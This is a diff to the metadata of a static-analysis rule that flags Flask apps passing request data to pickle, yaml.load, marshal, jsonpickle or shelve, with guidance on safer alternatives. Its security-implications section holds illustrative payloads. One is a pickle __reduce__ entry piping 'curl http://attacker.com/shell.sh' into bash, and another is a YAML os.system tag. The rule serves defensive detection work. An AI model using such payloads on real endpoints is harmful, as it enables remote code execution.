@@ -1,64 +1,273 @@
+# Rule Identity
 id: PYTHON-FLASK-SEC-013
 name: Flask Insecure Deserialization
-short_description: User input flows to unsafe deserialization (pickle/yaml). Use json.loads() or yaml.safe_load().
+short_description: User input from Flask request parameters flows to pickle.loads(), yaml.load(), marshal.loads(), jsonpickle.decode(), or shelve.open(). Use json.loads() or yaml.safe_load() for untrusted data.
+
+# Classification
 severity: CRITICAL
 category: flask
 language: python
-ruleset: python/PYTHON-FLASK-SEC-013
+ruleset: python/flask/PYTHON-FLASK-SEC-013
+
+# Vulnerability Details
 cwe:
-- id: CWE-502
-  name: Deserialization of Untrusted Data
-  url: https://cwe.mitre.org/data/definitions/502.html
+  - id: CWE-502
+    name: Deserialization of Untrusted Data
+    url: https://cwe.mitre.org/data/definitions/502.html
+
+owasp:
+  - id: A08:2021
+    name: Software and Data Integrity Failures
+    url: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
+
 tags:
-- python
-- flask
-- deserialization
-- pickle
-- yaml
-- rce
-- OWASP-A08
-- CWE-502
+  - python
+  - flask
+  - deserialization
+  - pickle
+  - yaml
+  - marshal
+  - jsonpickle
+  - shelve
+  - rce
+  - cross-file
+  - inter-procedural
+  - taint-analysis
+  - CWE-502
+  - OWASP-A08
+
+# Author
 author:
   name: Shivasurya
   url: https://x.com/sshivasurya
-description: "This rule detects insecure deserialization vulnerabilities in Flask applications where\n\
-  user-controlled input flows into dangerous deserialization functions across multiple Python\nserialization\
-  \ libraries. The following deserialization sinks are tracked:\n\n- **pickle.loads() / pickle.load()**:\
-  \ Python's native binary serialization format. By\n  design, pickle can instantiate arbitrary Python\
-  \ objects and execute code during\n  deserialization via the __reduce__ protocol.\n\n- **yaml.load()\
-  \ / yaml.unsafe_load()**: PyYAML's default loader can construct arbitrary\n  Python objects from YAML\
-  \ tags (!!python/object, !!python/object/apply), enabling code\n  execution through crafted YAML documents.\n\
-  \n- **marshal.loads() / marshal.load()**: Python's internal serialization for .pyc files.\n  Not intended\
-  \ for untrusted data and can cause crashes or undefined behavior.\n\n- **jsonpickle.decode()**: JSON-based\
-  \ serialization that preserves Python object types,\n  including the ability to reconstruct arbitrary\
-  \ objects during decoding.\n\n- **shelve.open()**: Persistent dictionary backed by pickle, inheriting\
-  \ all pickle\n  deserialization risks."
-message: User input flows to unsafe deserialization (pickle/yaml). Use json.loads() or yaml.safe_load().
-secure_example: "from flask import Flask, request\nimport json\nimport yaml\n\napp = Flask(__name__)\n\
-  \n@app.route('/api/import', methods=['POST'])\ndef import_data():\n    # SAFE: Use JSON for untrusted\
-  \ data (cannot execute code)\n    data = json.loads(request.get_data())\n    return {'imported': data}\n\
-  \n@app.route('/api/config', methods=['POST'])\ndef load_config():\n    config_yaml = request.form.get('config')\n\
-  \    # SAFE: yaml.safe_load() only allows basic YAML types\n    config = yaml.safe_load(config_yaml)\n\
-  \    return {'config': config}"
-recommendations: []
+
+# Content
+description: |
+  This rule detects insecure deserialization in Flask applications where user-
+  controlled input from HTTP request parameters flows into unsafe deserialization
+  functions. The following sinks are tracked:
+
+  - pickle.loads() / pickle.load(): Python's native binary serialization. By design,
+    pickle can instantiate arbitrary Python objects and execute code during deserialization
+    via the __reduce__ protocol. Deserializing attacker-supplied pickle data is equivalent
+    to arbitrary code execution.
+
+  - yaml.load() / yaml.unsafe_load(): PyYAML's full loaders can construct arbitrary
+    Python objects from YAML tags (!!python/object, !!python/object/apply), enabling
+    code execution through crafted YAML documents.
+
+  - marshal.loads() / marshal.load(): Python's internal bytecode serialization format.
+    Not designed for untrusted data -- malformed input can cause crashes or undefined
+    behavior, and code objects in marshal data execute during deserialization.
+
+  - jsonpickle.decode(): A JSON-based format that preserves Python object types.
+    Decoding attacker-supplied jsonpickle data can reconstruct arbitrary Python objects,
+    including those with dangerous __reduce__ implementations.
+
+  - shelve.open(): A persistent dictionary backed by pickle. Opening a shelve database
+    file supplied by an attacker inherits all pickle deserialization risks.
+
+  The taint analysis traces data from Flask request sources through variable assignments
+  and function calls to these deserialization functions at argument position 0. Flows
+  through json.loads(), yaml.safe_load(), or hmac.compare_digest() are recognized as
+  sanitizers -- json.loads() constrains the data to JSON types (no code execution),
+  yaml.safe_load() restricts YAML to basic types, and hmac.compare_digest() validates
+  a signature before deserialization.
+
+message: "User input flows to unsafe deserialization (pickle/yaml/marshal/jsonpickle). Use json.loads() or yaml.safe_load() for untrusted data."
+
+security_implications:
+  - title: Arbitrary Code Execution via pickle __reduce__
+    description: |
+      Python's pickle deserialization calls __reduce__ on each object during unpickling.
+      An attacker crafts a pickle payload where __reduce__ returns (os.system, ('curl http://attacker.com/shell.sh | bash',)).
+      When pickle.loads() processes this payload, it executes the OS command. There is
+      no way to safely deserialize untrusted pickle data -- the format is inherently unsafe.
+  - title: Remote Code Execution via YAML Object Construction
+    description: |
+      PyYAML's full loader supports !!python/object/apply:os.system ['id'] syntax
+      in YAML documents. yaml.load() with the default Loader (or yaml.unsafe_load())
+      processes this tag, calling os.system('id') during deserialization. Attackers
+      can use any callable available in the Python process.
+  - title: Persistent Backdoor via Shellcode Injection
+    description: |
+      A pickle payload can define and register new functions, modify global state,
+      and install persistent mechanisms in memory. If the Flask application reuses
+      Python worker processes across requests (typical in production), a deserialization
+      payload can install a backdoor that persists in memory and intercepts subsequent
+      requests in the same worker.
+  - title: Data Integrity Attacks via Marshal Exploitation
+    description: |
+      marshal can deserialize Python code objects. An attacker who can supply marshal
+      data can inject compiled Python bytecode that executes during deserialization.
+      While marshal crashes are less predictable than pickle RCE, they can be used for
+      denial of service and potentially for code execution on some Python versions.
+
+secure_example: |
+  from flask import Flask, request
+  import json
+  import yaml
+  import hmac
+  import hashlib
+
+  app = Flask(__name__)
+  SIGNING_SECRET = b'use-a-strong-random-secret-from-config'
+
+  @app.route('/api/import', methods=['POST'])
+  def import_data():
+      # SAFE: json.loads() supports only JSON types -- no code execution possible
+      try:
+          data = json.loads(request.get_data())
+      except json.JSONDecodeError:
+          return {'error': 'Invalid JSON'}, 400
+      return {'imported': len(data)}
+
+  @app.route('/api/config', methods=['POST'])
+  def load_config():
+      config_yaml = request.form.get('config', '')
+      # SAFE: yaml.safe_load() restricts to basic YAML types -- no Python object tags
+      try:
+          config = yaml.safe_load(config_yaml)
+      except yaml.YAMLError:
+          return {'error': 'Invalid YAML'}, 400
+      return {'loaded': True}
+
+  @app.route('/api/signed-data', methods=['POST'])
+  def load_signed_data():
+      signature = request.headers.get('X-Signature', '')
+      data = request.get_data()
+      # SAFE: verify HMAC signature before any deserialization
+      expected = hmac.new(SIGNING_SECRET, data, hashlib.sha256).hexdigest()
+      if not hmac.compare_digest(signature, expected):
+          return {'error': 'Invalid signature'}, 401
+      # Only deserialize after signature verification
+      return json.loads(data)
+
+recommendations:
+  - Replace pickle, yaml.load(), and jsonpickle with json.loads() for data exchange -- JSON supports all common data types (strings, numbers, lists, dicts, booleans, null) without any code execution capability.
+  - If YAML is required for configuration, always use yaml.safe_load() instead of yaml.load() -- safe_load() restricts parsing to basic YAML types and does not process Python object tags.
+  - If you must deserialize binary data from users (e.g., for a caching or session feature), sign the data with HMAC and verify the signature before deserialization -- only deserialize data that passes signature verification.
+  - Remove shelve and pickle from any code path that processes HTTP request data. These formats are for trusted data only (inter-process communication within the same trusted system).
+  - Audit all uses of pickle, yaml.load(), marshal, and jsonpickle in the codebase -- any that receive data from HTTP requests must be refactored to use safe alternatives.
+
+detection_scope: |
+  Scope: global (cross-file taint tracking across the entire project).
+
+  Sources: Flask HTTP input methods -- request.get_data(), request.get_json(),
+  request.form.get(), request.args.get() -- all of which can deliver attacker-
+  controlled binary or text data containing crafted serialization payloads.
+
+  Sinks: pickle.loads(), pickle.load(), yaml.load(), yaml.unsafe_load(),
+  marshal.loads(), marshal.load(), jsonpickle.decode(), shelve.open().
+  The .tracks(0) parameter targets argument position 0, the serialized data
+  input. For shelve.open(), position 0 is the filename -- tainted filenames
+  to shelve.open() indicate attacker-controlled database file selection.
+
+  Sanitizers: json.loads(), yaml.safe_load(), and hmac.compare_digest() are
+  recognized as sanitizers. json.loads() and yaml.safe_load() replace the unsafe
+  deserialization entirely. hmac.compare_digest() as a pre-deserialization
+  signature check prevents tampering.
+
+  The rule traces tainted data through variable assignments, base64 decoding,
+  and cross-file function calls to deserialization sinks.
+
+# References
 references:
-- title: CWE-502
-  url: https://cwe.mitre.org/data/definitions/502.html
-- title: OWASP Deserialization Cheat Sheet
-  url: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
-- title: Python Pickle Security Warning
-  url: https://docs.python.org/3/library/pickle.html
-- title: PyYAML Security
-  url: https://pyyaml.org/wiki/PyYAMLDocumentation
-- title: OWASP A08:2021
-  url: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
-compliance: []
-faq: []
-similar_rules: []
+  - title: "CWE-502: Deserialization of Untrusted Data"
+    url: https://cwe.mitre.org/data/definitions/502.html
+  - title: OWASP Deserialization Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
+  - title: Python pickle security warning
+    url: https://docs.python.org/3/library/pickle.html#restricting-globals
+  - title: PyYAML safe_load documentation
+    url: https://pyyaml.org/wiki/PyYAMLDocumentation
+  - title: OWASP A08:2021 Software and Data Integrity Failures
+    url: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
+  - title: Python marshal security considerations
+    url: https://docs.python.org/3/library/marshal.html
+
+# Compliance
+compliance:
+  - standard: OWASP Top 10
+    requirement: "A08:2021 - Software and Data Integrity Failures (insecure deserialization)"
+  - standard: CWE Top 25
+    requirement: "CWE-502 ranked in top dangerous software weaknesses"
+  - standard: PCI DSS v4.0
+    requirement: "Requirement 6.2.4 -- prevent deserialization attacks; Requirement 6.4.1 -- validate all data"
+  - standard: NIST SP 800-53
+    requirement: "SI-10: Information Input Validation; SI-3: Malicious Code Protection"
+  - standard: ASVS v4.0
+    requirement: "V5.5.3 -- verify that deserialization uses safe patterns or is protected by integrity checks"
+
+# FAQ
+faq:
+  - question: Is there any safe way to use pickle with user-supplied data?
+    answer: |
+      No. The Python documentation explicitly states: "The pickle module is not secure.
+      Only unpickle data you trust." There is no restriction or sandboxing mechanism
+      that makes pickle.loads() safe for attacker-supplied data. The __reduce__ protocol
+      is fundamental to how pickle works, and it allows arbitrary callable invocation.
+      The only safe approach is to not use pickle for data that comes from HTTP requests.
+
+  - question: yaml.safe_load() is recognized as safe. What does it restrict?
+    answer: |
+      yaml.safe_load() uses the SafeLoader which only allows YAML nodes that map to
+      basic Python types: str, int, float, list, dict, bool, None, datetime, bytes.
+      It does not process !!python/object, !!python/object/apply, or any other
+      Python-specific YAML tags that the full Loader uses. Crafted YAML with Python
+      object tags raises a ConstructorError rather than executing code.
+
+  - question: We receive base64-encoded pickle data from mobile clients. How do we migrate?
+    answer: |
+      Migrate the mobile clients to send JSON instead of base64-encoded pickle. This
+      requires a protocol version bump and a compatibility period where both formats
+      are accepted (verifying the JSON path with a flag before removing the pickle path).
+      If you absolutely cannot change the mobile client format immediately, sign the
+      pickle payloads with HMAC using a server-controlled key and only deserialize
+      payloads with valid signatures -- this prevents external attackers from injecting
+      arbitrary payloads while the migration proceeds.
+
+  - question: Does this rule cover all variants of yaml.load()?
+    answer: |
+      The sinks include yaml.load() and yaml.unsafe_load(). yaml.load() without an
+      explicit Loader argument triggers a warning in recent PyYAML versions and uses
+      the FullLoader by default (which has some mitigations but is not fully safe).
+      yaml.unsafe_load() is the explicitly dangerous variant. Both are tracked.
+
+  - question: We use jsonpickle for session serialization. What should we replace it with?
+    answer: |
+      Replace jsonpickle with Flask's built-in session mechanism (flask.session) which
+      uses itsdangerous for signed cookie serialization. For server-side sessions, use
+      flask-session with Redis or database backend storing JSON-encoded session data.
+      If you need to serialize complex Python objects, define an explicit JSON schema
+      and write custom serialization/deserialization logic -- never rely on formats that
+      can reconstruct arbitrary objects from untrusted data.
+
+  - question: Can I add a __reduce__ allowlist to make pickle safe?
+    answer: |
+      Python's RestrictedUnpickler pattern attempts to limit which classes can be
+      instantiated during pickling. However, there are known bypasses that reach
+      dangerous callables through allowed classes via attribute chains. No known
+      RestrictedUnpickler implementation has been proven secure against a determined
+      attacker. The Python security advisory team's position is that pickle should
+      not be used with untrusted data regardless of restrictions applied.
+
+  - question: How does HMAC signing prevent deserialization attacks?
+    answer: |
+      If you sign serialized data with HMAC using a server-side secret key, the attacker
+      cannot produce a valid signature for a crafted payload without knowing the secret.
+      Verification with hmac.compare_digest() (timing-safe comparison) before deserialization
+      ensures only data that originated from your server is deserialized. This is the
+      pattern used by Flask's signed cookie sessions and itsdangerous.
+
+# Similar Rules
+similar_rules:
+  - PYTHON-FLASK-SEC-005
+  - PYTHON-DJANGO-SEC-013
+  - PYTHON-LAMBDA-SEC-007
+  - PYTHON-LANG-SEC-070
+
+# Test Files
 tests:
   positive: tests/positive/
   negative: tests/negative/
-owasp:
-- id: A08:2021
-  name: ''
-  url: ''
